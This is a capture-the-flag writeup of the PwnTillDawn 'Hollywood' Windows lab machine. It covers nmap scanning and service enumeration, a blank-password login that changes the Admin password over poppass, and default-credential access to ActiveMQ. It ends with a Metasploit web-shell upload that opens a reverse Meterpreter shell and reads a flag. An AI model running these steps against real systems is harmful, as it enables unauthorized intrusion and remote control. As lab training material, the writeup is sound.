+++ 
author = ['Abdallah Adham']
title = "Hollywood PwnTillDawn Writeup"
date = 2022-12-05
description = "This is a writeup of the Hollywood machine in PwnTillDawn Online platform."
draft = false
slug = ""

tags = [
	'PwnTillDawn',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG"
+++

---

This writeup has been authorized by the **PwnTillDawn Crew**! 

Check their websites for more information!
1. [wizlynxgroup](https://www.wizlynxgroup.com/)
2. [online.pwntilldawn](https://online.pwntilldawn.com/)

## Target Information

| Name | IP | Operating System | Difficulty| 
|----------- | ----------- | ----------- |  -----------|
|**Hollywood**| **10.150.150.219** | **Windows** | **Easy** |


## Scanning

### Nmap Scanning
```bash
$ nmap 10.150.150.219 -p- -A
Nmap scan report for 10.150.150.219
Host is up (0.064s latency).
Not shown: 65491 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
25/tcp    open     smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open     finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
80/tcp    open     http           Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| http-title: Welcome to XAMPP
|_Requested resource was http://10.150.150.219/dashboard/
105/tcp   open     ph-addressbook Mercury/32 PH addressbook server
106/tcp   open     pop3pw         Mercury/32 poppass service
110/tcp   open     pop3           Mercury/32 pop3d
|_pop3-capabilities: USER TOP APOP EXPIRE(NEVER) UIDL
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open     imap           Mercury/32 imapd 4.62
|_imap-capabilities: CAPABILITY complete X-MERCURY-1A0001 OK IMAP4rev1 AUTH=PLAIN
443/tcp   open     ssl/http       Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://10.150.150.219/dashboard/
445/tcp   open     microsoft-ds   Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open     rtsp?
1562/tcp  filtered pconnectmgr
1883/tcp  open     mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
2224/tcp  open     http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
2869/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
2882/tcp  filtered ndtp
3306/tcp  open     mysql          MariaDB (unauthorized)
3521/tcp  filtered mc3ss
5672/tcp  open     amqp?
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    AMQP
8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.56
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
8089/tcp  open     ssl/http       Splunkd httpd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:17:32
|_Not valid after:  2022-10-27T09:17:32
| http-robots.txt: 1 disallowed entry 
|_/
8161/tcp  open     http           Jetty 8.1.16.v20140903
|_http-server-header: Jetty(8.1.16.v20140903)
|_http-title: Apache ActiveMQ
8546/tcp  filtered unknown
10243/tcp open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
61613/tcp open     stomp          Apache ActiveMQ 5.10.1 - 5.11.1
61614/tcp open     http           Jetty 8.1.16.v20140903
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Error 500 Server Error
|_http-server-header: Jetty(8.1.16.v20140903)
61616/tcp open     apachemq       ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     StackTraceEnabled
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|_    MaxInactivityDurationInitalDelay
Service Info: Hosts: localhost, HOLLYWOOD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Hollywood
|   NetBIOS computer name: HOLLYWOOD\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-06T04:02:19+08:00
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4262.54 seconds
```

## Enumeration

### FTP Enumeration

Let's see the **FTP server** hosted on the victim's machine, We can see that it is **FileZilla service**.

```bash
$ ftp 10.150.150.219 
Connected to 10.150.150.219.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (10.150.150.219:pyke):
```

Maybe we can find some exploits related to its **version**!

I have found an exploit related to this **FileZilla** version at this [github](https://github.com/NeoTheCapt/FilezillaExploit) repository, We can see it at the exploiation phase after we do all our enumerations.

### SMTP Enumeration

We can see from the **Nmap scanner** report that the **SMTP** server is **Mercury**, After some **googling** i didn't find any exploits except **DoS** attacks which i don't think it is our objective. 

Also, I have ran an **Nmap script** to know the commands that i can run in the **SMTP** server.
```bash
$ nmap -p25 --script smtp-commands 10.150.150.219
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 11:49 EST
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 10.150.150.219
Host is up (0.099s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME

Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

### Finger Enumeration

I have found that there is a port associated with a service called **finger**, which it is my first time seeing it.

The **Name/Finger Protocol (FINGER)** is an application-level Internet protocol that provides an interface between the finger command and the fingerd daemon. 
The fingerd daemon returns information about the users currently logged in to a specified remote host.

Okay, Let's see if we can get anything out of it.

#### Banner Grabbing/Basic connection
```
$ nc -vn 10.150.150.219 79
(UNKNOWN) [10.150.150.219] 79 (finger) open

Login: Admin         Name: Mail System Administrator
```

So, We know that there is a user called **Admin** and he is the **Mail System Administrator**.

### POP3 Enumeration

So, There are two ports associated with **POP** services, Let's if we can get benefit from them.

```bash
106/tcp   open  pop3pw       Mercury/32 poppass service
110/tcp   open  pop3         Mercury/32 pop3d
|_pop3-capabilities: USER EXPIRE(NEVER) APOP TOP UIDL
```

#### 106 Port

```bash
$ nc -nv 10.150.150.219 106                                                                         
(UNKNOWN) [10.150.150.219] 106 (poppassd) open
200 localhost MercuryW PopPass server ready.
help
100-Mercury PopPass Server v4.62
100-This server recognizes the following commands:
100-   USER     Enter your user (login) name
100-   PASS     Enter the password matching your username
100-   NEWPASS  Change your password on this system.
100-   QUIT     Logout and close the connection.
100 You must login using USER/PASS before attempting NEWPASS.
```

Okay, I have got an idea whis is to login with user `Admin` and password as blank, Let's see!

```bash
USER Admin
300 Send current password using PASS command:
PASS 
200 OK, 'Admin' logged in.
```

Wow, It worked!

Now, Let's get a new password for the user `Admin`!

```bash
NEWPASS test
200 OK, password changed.
```

Okay, So we have a user `Admin` and password `test`, Let's get to the other **POP** service!

#### 110 Port

```bash
$ nc -nv 10.150.150.219 110                                                                         
(UNKNOWN) [10.150.150.219] 110 (pop3) open
+OK <12787729.18997@localhost>, POP3 server ready.
HELP 
+OK
Mercury/32 MTS Post Office Protocol v3 server v4.62,
Copyright (c) 1993-2008 David Harris.
This server recognizes the following commands:
  USER - login as a user
  PASS - specify a password
  APOP - perform secure login
  CAPA - RFC2449 capability discovery
  STLS - Start TLS negotiation, if enabled
  STAT - show mailbox statistics
  RETR - send a message
  LIST - show message numbers and sizes
  DELE - delete a message
  RSET - 'undo' all mailbox changes
  TOP  - show lines from a message
  QUIT - close the connection
  NOOP, RPOP, LAST are also supported.

Extended commands:
  XTND XMIT  - Send a message via POP3
  XTND XLST  - Eudora extended list command
  UIDL - return unique identifier (RFC1725).
.
```

Let's login with our credientials!
```bash
USER Admin
+OK Admin is known here.
PASS test
+OK Welcome! 0 messages (0 bytes)
```

I think this is a **Rabbit hole** and nothing is important in those ports.

### HTTP Enumeration

#### 80 Port
![http](post/Hollywood_PwnTillDawn/imgs/1.JPG)

It is the home page of **XAMPP** server that host the website for Windows machines.

If we have got into any directory that doesn't exist and we viewed the **source page**, We will see the first **flag** in it.

_FLAG30_
![http](post/Hollywood_PwnTillDawn/imgs/7.JPG)

Nothing else is here that is important!

#### 2224 Port

![http2](post/Hollywood_PwnTillDawn/imgs/2.JPG)

It looks like this **HTTP service** is hosting the **Mercury SMTP** mailing management services.

When we click on the link shown above it redirect us to a form that manage the mailing subscription services.


![http2_2](post/Hollywood_PwnTillDawn/imgs/3.JPG)

I think nothing else is valuable here!

#### 8080 Port

![http3](post/Hollywood_PwnTillDawn/imgs/4.JPG)

At this **HTTP** port there is a an **Apache Tomcat** server is hosted but in order to go to the **Manager App** we need credientials.

![http3_2](post/Hollywood_PwnTillDawn/imgs/5.JPG)

#### 8161 Port

![http4](post/Hollywood_PwnTillDawn/imgs/6.JPG)

In this **HTTP** port there is **Apache ActiveMQ** hosted on it!

We can do some search for this service and see what we can do with it?

**ActiveMQ** is an open source protocol developed by Apache which functions as an implementation of message-oriented middleware (MOM). Its basic function is to **send messages between different applications**, but includes additional features like STOMP, JMS, and OpenWire.

If we clicked on the link **Manage ActiveMQ broker** it will pop up a login form for the **admin** access.

So I have searched for the default credientials for the admin account and they've said that:

The default administration user name and password for the Apache ActiveMQ Administration Console is **admin** and **admin** respectively. You should change these default credentials.

So, I have tried it and it worked!

_FLAG33_
![http4_2](post/Hollywood_PwnTillDawn/imgs/8.JPG)

Now, We have to get a **Reverse shell** in order to get the last flag from the system.

## Exploitation

Let's search if there are any exploits for **Apache ActiveMQ**!

I came across an exploit from the [Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/apache_activemq_upload_jsp/) and we will use **Metasploit** ofcourse in order to this exploit which will be a **Web Shell** upload.

Let's make our way to get the **RevShell**!

```bash
msf6 > use exploit/multi/http/apache_activemq_upload_jsp
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_activemq_upload_jsp) > show targets
Exploit targets:
   Id  Name
   --  ----
   0   Java Universal
   1   Linux
   2   Windows
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set target 2
target => 2
msf6 exploit(multi/http/apache_activemq_upload_jsp) > show options

Module options (exploit/multi/http/apache_activemq_upload_jsp):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AutoCleanup    true             no        Remove web shells after callback is received
   BasicAuthPass  admin            yes       The password for the specified username
   BasicAuthUser  admin            yes       The username to authenticate as
   JSP                             no        JSP name to use, excluding the .jsp extension (default: random)
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          8161             yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                           no        HTTP server virtual host
Payload options (java/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.152.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   2   Windows
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set RHOSTS 10.150.150.219
RHOSTS => 10.150.150.219
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set LHOST 10.66.X.X
msf6 exploit(multi/http/apache_activemq_upload_jsp) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_activemq_upload_jsp) > run
```

Boom! We got the **Meterpreter** Shell

```bash
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//pKFhVUPzZsgES.jar
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//pKFhVUPzZsgES.jsp
[*] Sending stage (175686 bytes) to 10.150.150.219
[+] Deleted C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//pKFhVUPzZsgES.jsp
[*] Meterpreter session 1 opened (10.66.X.X:4444 -> 10.150.150.219:49309) at 2022-12-05 15:46:27 -0500
meterpreter > getuid
Server username: HOLLYWOOD\User
```

Now, Let's switch up to the **CMD shell** and navigate to get our last flag.

```powershell
meterpreter > shell
Process 4696 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 021A-9C32
 Directory of C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin
11/13/2018  05:06 PM    <DIR>          .
11/13/2018  05:06 PM    <DIR>          ..
02/13/2015  11:05 AM            19,091 activemq
02/13/2015  11:05 AM             5,665 activemq-admin
02/13/2015  11:05 AM             4,211 activemq-admin.bat
02/13/2015  11:05 AM             4,211 activemq.bat
02/13/2015  11:02 AM            15,956 activemq.jar
11/13/2018  05:06 PM    <DIR>          win32
11/13/2018  05:06 PM    <DIR>          win64
02/13/2015  10:54 AM            83,820 wrapper.jar
               6 File(s)        132,954 bytes
               4 Dir(s)  44,541,952,000 bytes free
```

_FLAG9_
```powershell
C:\Users\User\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 021A-9C32

 Directory of C:\Users\User\Documents

03/22/2019  04:12 PM    <DIR>          .
03/22/2019  04:12 PM    <DIR>          ..
03/22/2019  04:12 PM                43 FLAG9.txt
               1 File(s)             43 bytes
               2 Dir(s)  44,541,952,000 bytes free
C:\Users\User\Documents>type FLAG9.txt
type FLAG9.txt
b017cd11a8def6b4bae78bXXXXXXXXXXXXXXXXXXX               
```

_Pwned_

![pwned](post/Hollywood_PwnTillDawn/imgs/9.JPG)